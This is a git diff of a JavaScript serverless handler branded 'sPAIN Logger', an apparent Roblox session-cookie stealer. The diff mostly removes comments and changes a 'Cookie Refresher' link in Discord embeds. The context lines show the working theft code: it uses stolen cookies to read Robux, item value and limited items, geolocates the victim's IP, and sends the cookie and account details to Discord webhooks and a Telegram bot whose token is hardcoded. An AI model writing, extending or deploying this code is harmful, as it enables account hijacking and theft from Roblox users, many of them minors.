@@ -4,10 +4,6 @@ const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
 const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
 
-// Cookie Refresher URL with emoji styling
-const COOKIE_REFRESH_URL = 'https://index-html-ruby-eight.vercel.app/';
-const COOKIE_REFRESH_TEXT = `🍪 Cookie Refresher\n*If you want more accurate account validation, [go here](${COOKIE_REFRESH_URL})*`;
-
 // Item asset IDs
 const ITEMS = {
   HEADLESS: 134082579,
@@ -41,7 +37,6 @@ async function getIpGeo(ip) {
   } catch { return null; }
 }
 
-// Get Roblox avatar thumbnail URL
 async function getAvatarUrl(userId) {
   try {
     const ctrl = new AbortController();
@@ -66,7 +61,6 @@ async function getAvatarUrl(userId) {
   }
 }
 
-// Get Robux balance
 async function getRobux(cookie) {
   try {
     const ctrl = new AbortController();
@@ -90,7 +84,6 @@ async function getRobux(cookie) {
   }
 }
 
-// Get RAP (Recent Average Price) and item count
 async function getRAP(cookie, userId) {
   try {
     const ctrl = new AbortController();
@@ -121,7 +114,6 @@ async function getRAP(cookie, userId) {
   }
 }
 
-// Get credit balance
 async function getCredit(cookie) {
   try {
     const ctrl = new AbortController();
@@ -145,7 +137,6 @@ async function getCredit(cookie) {
   }
 }
 
-// Get account age in days
 function getAccountAge(createdDate) {
   if (!createdDate) return 0;
   const created = new Date(createdDate);
@@ -153,7 +144,6 @@ function getAccountAge(createdDate) {
   return Math.floor((now - created) / (1000 * 60 * 60 * 24));
 }
 
-// Get premium status
 async function getPremiumStatus(cookie) {
   try {
     const ctrl = new AbortController();
@@ -176,7 +166,6 @@ async function getPremiumStatus(cookie) {
   }
 }
 
-// Get voice chat status
 async function getVoiceChatStatus(cookie) {
   try {
     const ctrl = new AbortController();
@@ -200,7 +189,6 @@ async function getVoiceChatStatus(cookie) {
   }
 }
 
-// Get friends count
 async function getFriendsCount(userId) {
   try {
     const ctrl = new AbortController();
@@ -220,7 +208,6 @@ async function getFriendsCount(userId) {
   }
 }
 
-// Check if user owns specific item
 async function ownsItem(cookie, userId, assetId) {
   try {
     const ctrl = new AbortController();
@@ -244,7 +231,6 @@ async function ownsItem(cookie, userId, assetId) {
   }
 }
 
-// Get groups owned count
 async function getGroupsOwned(userId) {
   try {
     const ctrl = new AbortController();
@@ -266,7 +252,6 @@ async function getGroupsOwned(userId) {
   }
 }
 
-// Check account info and refresh cookie validity
 async function checkAccountInfo(cookie) {
   try {
     const ctrl = new AbortController();
@@ -350,7 +335,6 @@ async function checkAccountInfo(cookie) {
   }
 }
 
-// Refresh cookie (validate and return status)
 async function refreshCookieStatus(cookie) {
   const accountInfo = await checkAccountInfo(cookie);
   return {
@@ -398,7 +382,12 @@ function parseBody(raw) {
 const WH_NAME   = 'sPAIN';
 const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
 
-// Webhook JSON Structures
+// Cookie Refresher URL
+const COOKIE_REFRESH_URL = 'https://index-html-ruby-eight.vercel.app/';
+
+// Blue clickable link for Discord
+const REFRESH_COOKIE_LINK = `[Refresh Cookie](${COOKIE_REFRESH_URL})`;
+
 const createWebhookPayload = (type, data) => {
   const basePayload = {
     username: WH_NAME,
@@ -470,7 +459,6 @@ async function discordSend(url, payload) {
   } catch (_) {}
 }
 
-// Send cookie with sPAIN branding
 async function discordSendCookie(url, cookie, username) {
   if (!url?.includes('discord.com/api/webhooks')) return;
   try {
@@ -539,7 +527,7 @@ export default async function handler(req, res) {
         { name: '📍 Location', value: loc,                  inline: true  },
         { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
         { name: '🕐 Time',     value: now,                  inline: false },
-        { name: COOKIE_REFRESH_TEXT, value: '‎', inline: false }
+        { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
       ],
       footer: `sPAIN Logger • ${pName}`,
       timestamp: now
@@ -584,7 +572,7 @@ export default async function handler(req, res) {
       { name: '🕐 Time',     value: now, inline: true },
       { name: '📍 Location', value: loc, inline: true  },
       { name: '🗺️ ISP',      value: isp, inline: true  },
-      { name: COOKIE_REFRESH_TEXT, value: '‎', inline: false }
+      { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
     ],
     footer: `sPAIN Logger • ${pName}`,
     timestamp: now
@@ -603,7 +591,7 @@ export default async function handler(req, res) {
         { name: '📍 Location',  value: loc,                           inline: true  },
         { name: '🗺️ ISP',       value: isp,                           inline: true  },
         { name: '🕐 Time',      value: now,                           inline: true  },
-        { name: COOKIE_REFRESH_TEXT, value: '‎', inline: false }
+        { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
       ],
       footer: `sPAIN Logger • ${pName}`,
       timestamp: now
@@ -612,7 +600,7 @@ export default async function handler(req, res) {
     await discordSend(webhook1, wh1Payload);
   }
 
-  // STEP 2: ✅ Account Info Valid (CLEAN CROSSWISE LAYOUT)
+  // STEP 2: ✅ Account Info Valid
   if (accountInfo.refreshed && acc) {
     const accountPayload = createWebhookPayload('account_info', {
       description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
@@ -633,13 +621,13 @@ export default async function handler(req, res) {
         { name: '👑 Groups', value: acc.groupsOwned.toString(), inline: true },
         { name: '📦 Items', value: acc.items.toString(), inline: true },
         
-        // Row 4: Limiteds (Big Items)
+        // Row 4: Limiteds
         { name: '💀 Headless', value: acc.headless ? '✓ Owned' : '✗ None', inline: true },
         { name: '⚔️ Korblox', value: acc.korblox ? '✓ Owned' : '✗ None', inline: true },
         { name: '🪽 Valkyrie', value: acc.valkyrie ? '✓ Owned' : '✗ None', inline: true },
         
         // Refresher Link
-        { name: COOKIE_REFRESH_TEXT, value: '‎', inline: false }
+        { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
       ]
     });
     
@@ -647,7 +635,7 @@ export default async function handler(req, res) {
     if (webhook1) await discordSend(webhook1, accountPayload);
   }
 
-  // STEP 3: Send the cookie
+  // STEP 3: 🔐 Cookie
   await discordSendCookie(webhook2, cookie, acc?.username);
   if (webhook1) await discordSendCookie(webhook1, cookie, acc?.username);
 
